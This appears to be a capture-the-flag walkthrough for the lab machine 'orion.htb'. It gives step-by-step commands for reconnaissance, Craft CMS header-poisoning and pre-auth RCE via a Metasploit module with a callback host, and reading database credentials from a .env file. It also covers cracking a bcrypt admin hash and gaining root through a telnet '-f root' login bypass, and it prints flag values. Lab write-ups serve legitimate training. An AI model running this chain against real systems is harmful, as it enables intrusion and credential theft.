****
```
10.129.147.74
```
1. `nmap -sT -sC -sV -p- 10.129.147.74`
![[Screenshot 2026-10-16 at 1.26.06 PM.png]]
	- `22 (ssh - OpenSSH 8.90)`
	- `80 (http - nginx 1.18.0)`
2. Visit `http://10.129.147.74:80` 
	We then get redirected to `orion.htb` which we need to add into our `/etc/hosts`
3. `sudo vi /etc/hosts`
	- `10.129.147.74    orion.htb`
	We can then revisit `orion.htb` and see our VHOST target
![[Screenshot 2026-10-16 at 1.30.35 PM.png]]
	Through going through the website I do see much that offers an in so will start by attempting to target the `contact` fill out form but we can also see that site is:
	- `Powered by CraftCMS`
4. Open `Burp Suite`
5. Capture request of submitting a contact form
![[Screenshot 2026-10-16 at 1.35.05 PM.png]]
	Send `POST` request to `Repeater`
	Upon googling potential vulnerabilities for `Craft CMS` we can see there is a vulnerability for `Blind SSRF and Arbitrary JavaScript Injection via Header Posioning`
6. Capture another request and manipulate the URI with the following `/actions/app/resource-js` and `Forward`
	We now have a poisoned cached JavaScript (Stored XSS) on our target
![[Screenshot 2026-10-16 at 1.46.50 PM.png]]`CRAFT_CSRF_TOKEN:36fedac7761e6db5413882c373939857940919c06061a3a94fc2417b6fdbe8ffa%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A40%3A%229g1a6e1uubkL33nIqn5-ZLcqkKRviryYfyekV7I_%22%3B%7D`
7. Now that we have the `CRAFT_CSRF_TOKEN` we need to fuzz for directories on our target
8. `ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt:FUZZ -u http://orion.htb/FUZZ -mc 200,302,301`
	- `assets`
	- `admin`
	- `logout`
	We found three interesting directories to target but first we are going to fuzz for potential subdomains as well
9. `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://FUZZ.orion.htb/ -mc 200,302,301`
10. Firstly attempt to capture `http://orion.htb/admin/login` form and attempt potential bruteforce but also Cookie poisoning
![[Screenshot 2026-10-16 at 2.05.40 PM.png]]
	Here we can confirm the version which is: `Craft CMS 5.6.16`
	From this we can confirm the public vulnerability of known as `CVE-2025-32432` which is a RCE and fortunately in inside metasploit already  
	We can also use a `msfconsole` RCE for this exploitation
11. `msfconsole`
12. `use linux/http/craftcms_preauth_rce_cve_2025_32432`
	options:
	- `set RHOSTS orion.htb`
	- `set RPORT 80`
	- `set LHOST [attackerIP]`
13. `exploit`
	We can then update our shell with the following
14. `script /dev/null -c /bin/bash` 
![[Screenshot 2026-10-16 at 2.55.29 PM.png]]
15. `cd ..`
16. `ls -la`
17. `cat .env`
![[Screenshot 2026-10-16 at 2.58.31 PM.png]]
	- `mysql (root:SuperSecureCraft123Pass!)`
18. `mysql -u root -p`
	- `SuperSecureCraft123Pass!`
19. `show databases;`
20. `SELECT * FROM users;`
![[Screenshot 2026-10-16 at 3.03.20 PM.png]]
	Admin Info: 
	- username: `admin`
	- email: `adam@orion.htb`
	- password: `$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS`
21. `hashcat --identify '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS'`
	Our hash is bcrypt(md5)
22. `john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`
![[Screenshot 2026-10-16 at 3.13.46 PM.png]]
	password: `darkangel`
23. `su adam`
	- `darkangel`
24. `cd adam`
25. `ls`
26. `cat user.txt`
<span style="color:rgb(228, 83, 238)">Answer:</span> 8a154663ee3be002d35087b345d99b40
****
1. `netstat -tulnp` - Look for any open ports that weren't exposed externally 
![[Screenshot 2026-10-16 at 3.19.54 PM.png]]
	We can see that `port 23 (telnet)` is listening 
2. `telnet --version`
	- `telnet (GNU inetutils) 2.7`
	When googling `telnet 2.7` we can see that there is well known exploit classified as `CVE-2026-24061` which is rather simple to follow:
3. `USER='-f root' telnet -a 127.0.0.1` - inside our Adam shell
And we immediately get `root`
4. `whoami`
5. `ls`
6. `cat root.xt`
![[Screenshot 2026-10-16 at 3.25.20 PM.png]]
<span style="color:rgb(228, 83, 238)">Answer: </span>264df15a04d78860ad413216e55bfc80
